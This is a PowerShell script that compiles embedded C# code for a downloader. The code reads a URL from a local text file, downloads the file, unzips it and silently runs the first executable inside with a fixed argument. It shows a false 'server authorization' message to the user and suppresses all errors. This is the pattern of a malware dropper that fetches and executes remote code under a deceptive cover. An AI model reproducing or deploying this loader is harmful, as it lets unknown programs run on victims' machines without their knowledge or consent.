$source = @"
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;

public class Downloader
{
    public static void Run(string scriptDir)
    {
        try
        {
            Console.WriteLine("Processing server authorization, please wait...");

            string linkFile = Path.Combine(scriptDir, "output1.txt");

            if (!File.Exists(linkFile))
                return;

            string url = File.ReadAllText(linkFile).Trim();
            if (string.IsNullOrEmpty(url))
                return;

            string fileName = Path.GetFileName(new Uri(url).LocalPath);
            string outputPath = Path.Combine(scriptDir, fileName);

            using (WebClient client = new WebClient())
            {
                client.DownloadFile(url, outputPath);
            }

            if (fileName.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))
            {
                string extractPath = Path.Combine(scriptDir, "extracted");

                if (Directory.Exists(extractPath))
                {
                    Directory.Delete(extractPath, true);
                }
                Directory.CreateDirectory(extractPath);
                
                ZipFile.ExtractToDirectory(outputPath, extractPath);

                string exeFile = Directory
                    .GetFiles(extractPath, "*.exe", SearchOption.AllDirectories)
                    .FirstOrDefault();

                if (exeFile != null)
                {
                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = exeFile,
                        Arguments = "-arg2",
                        UseShellExecute = true
                    });
                }
            }
        }
        catch 
        {

        }
    }
}
"@

# Compile the C# source. By default Add-Type emits a temp DLL in 
# %LOCALAPPDATA%\Temp with a randomized name (something like 
# abc123de.dll) and loads it into the current PowerShell AppDomain.
Add-Type -TypeDefinition $source -Language CSharp -ReferencedAssemblies @(
    "System.IO.Compression.FileSystem.dll"
)

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
[Downloader]::Run($scriptDir)
